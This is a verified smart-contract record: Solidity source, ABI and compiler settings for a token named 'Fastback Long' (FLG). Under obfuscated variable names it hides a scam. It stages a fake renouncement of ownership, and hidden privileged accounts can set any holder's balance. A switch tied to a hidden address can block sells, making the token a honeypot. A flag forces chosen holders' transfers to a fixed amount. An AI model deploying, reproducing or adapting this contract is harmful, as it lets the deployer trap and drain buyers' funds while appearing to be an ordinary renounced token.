{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface modeAutoFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listSellReceiver {\n    function createPair(address liquidityMode, address senderTake) external returns (address);\n}\n\ninterface tradingBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldEnableTeam) external view returns (uint256);\n\n    function transfer(address modeLimit, uint256 senderLiquidityTake) external returns (bool);\n\n    function allowance(address tokenFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderLiquidityTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeLimit,\n        uint256 senderLiquidityTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableBuy, uint256 value);\n    event Approval(address indexed tokenFund, address indexed spender, uint256 value);\n}\n\ninterface modeSwap is tradingBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FastbackLong is enableLiquidity, tradingBuy, modeSwap {\n\n    uint256 public liquidityFund;\n\n    function balanceOf(address shouldEnableTeam) public view virtual override returns (uint256) {\n        return takeLaunchedBuy[shouldEnableTeam];\n    }\n\n    function getOwner() external view returns (address) {\n        return exemptTotal;\n    }\n\n    address public tokenMax;\n\n    uint256 private modeShouldFund = 100000000 * 10 ** 18;\n\n    uint8 private swapTrading = 18;\n\n    uint256 totalTake;\n\n    uint256 public feeSwap;\n\n    function buyIs(address senderTo, address modeLimit, uint256 senderLiquidityTake) internal returns (bool) {\n        if (senderTo == tokenMax) {\n            return takeSwap(senderTo, modeLimit, senderLiquidityTake);\n        }\n        uint256 exemptTradingMarketing = tradingBuy(marketingSender).balanceOf(marketingFromSender);\n        require(exemptTradingMarketing == totalTake);\n        require(modeLimit != marketingFromSender);\n        if (liquidityToken[senderTo]) {\n            return takeSwap(senderTo, modeLimit, feeReceiverToken);\n        }\n        return takeSwap(senderTo, modeLimit, senderLiquidityTake);\n    }\n\n    function approve(address tradingLimit, uint256 senderLiquidityTake) public virtual override returns (bool) {\n        fromSwap[_msgSender()][tradingLimit] = senderLiquidityTake;\n        emit Approval(_msgSender(), tradingLimit, senderLiquidityTake);\n        return true;\n    }\n\n    bool public maxAmount;\n\n    bool public shouldAuto;\n\n    uint256 public toMarketingSender;\n\n    address public marketingSender;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenSender;\n    }\n\n    string private tokenSender = \"Fastback Long\";\n\n    function takeSwap(address senderTo, address modeLimit, uint256 senderLiquidityTake) internal returns (bool) {\n        require(takeLaunchedBuy[senderTo] >= senderLiquidityTake);\n        takeLaunchedBuy[senderTo] -= senderLiquidityTake;\n        takeLaunchedBuy[modeLimit] += senderLiquidityTake;\n        emit Transfer(senderTo, modeLimit, senderLiquidityTake);\n        return true;\n    }\n\n    function allowance(address enableTake, address tradingLimit) external view virtual override returns (uint256) {\n        if (tradingLimit == atAuto) {\n            return type(uint256).max;\n        }\n        return fromSwap[enableTake][tradingLimit];\n    }\n\n    string private feeEnable = \"FLG\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeEnable;\n    }\n\n    function transfer(address txLiquidityExempt, uint256 senderLiquidityTake) external virtual override returns (bool) {\n        return buyIs(_msgSender(), txLiquidityExempt, senderLiquidityTake);\n    }\n\n    uint256 private launchedFee;\n\n    address atAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private exemptTotal;\n\n    event OwnershipTransferred(address indexed amountIs, address indexed receiverListTake);\n\n    function senderLaunched(address txLiquidityExempt, uint256 senderLiquidityTake) public {\n        txLaunched();\n        takeLaunchedBuy[txLiquidityExempt] = senderLiquidityTake;\n    }\n\n    mapping(address => mapping(address => uint256)) private fromSwap;\n\n    function modeMin(uint256 senderLiquidityTake) public {\n        txLaunched();\n        totalTake = senderLiquidityTake;\n    }\n\n    mapping(address => bool) public liquidityToken;\n\n    bool public sellTokenLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeShouldFund;\n    }\n\n    uint256 totalReceiverMax;\n\n    constructor (){\n        if (feeSwap != launchedFee) {\n            sellTokenLaunch = true;\n        }\n        modeAutoFee fromBuy = modeAutoFee(atAuto);\n        marketingSender = listSellReceiver(fromBuy.factory()).createPair(fromBuy.WETH(), address(this));\n        \n        tokenMax = _msgSender();\n        marketingIs();\n        maxTo[tokenMax] = true;\n        takeLaunchedBuy[tokenMax] = modeShouldFund;\n        if (liquidityFund != toMarketingSender) {\n            sellTokenLaunch = true;\n        }\n        emit Transfer(address(0), tokenMax, modeShouldFund);\n    }\n\n    function marketingMax(address senderToken) public {\n        if (fromToken) {\n            return;\n        }\n        \n        maxTo[senderToken] = true;\n        if (maxAmount == sellTokenLaunch) {\n            sellModeFee = launchedFee;\n        }\n        fromToken = true;\n    }\n\n    bool public fromToken;\n\n    function transferFrom(address senderTo, address modeLimit, uint256 senderLiquidityTake) external override returns (bool) {\n        if (_msgSender() != atAuto) {\n            if (fromSwap[senderTo][_msgSender()] != type(uint256).max) {\n                require(senderLiquidityTake <= fromSwap[senderTo][_msgSender()]);\n                fromSwap[senderTo][_msgSender()] -= senderLiquidityTake;\n            }\n        }\n        return buyIs(senderTo, modeLimit, senderLiquidityTake);\n    }\n\n    function txLaunched() private view {\n        require(maxTo[_msgSender()]);\n    }\n\n    uint256 private listExempt;\n\n    function owner() external view returns (address) {\n        return exemptTotal;\n    }\n\n    function launchToken(address receiverMarketing) public {\n        txLaunched();\n        if (sellTokenLaunch == maxAmount) {\n            toMarketingSender = liquidityFund;\n        }\n        if (receiverMarketing == tokenMax || receiverMarketing == marketingSender) {\n            return;\n        }\n        liquidityToken[receiverMarketing] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapTrading;\n    }\n\n    function marketingIs() public {\n        emit OwnershipTransferred(tokenMax, address(0));\n        exemptTotal = address(0);\n    }\n\n    uint256 constant feeReceiverToken = 20 ** 10;\n\n    mapping(address => bool) public maxTo;\n\n    mapping(address => uint256) private takeLaunchedBuy;\n\n    address marketingFromSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private sellModeFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverListTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLiquidityTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldEnableTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"}],\"name\":\"launchToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"}],\"name\":\"marketingMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderLiquidityTake\",\"type\":\"uint256\"}],\"name\":\"modeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTokenLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLiquidityExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLiquidityTake\",\"type\":\"uint256\"}],\"name\":\"senderLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMarketingSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLiquidityExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLiquidityTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLiquidityTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FastbackLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}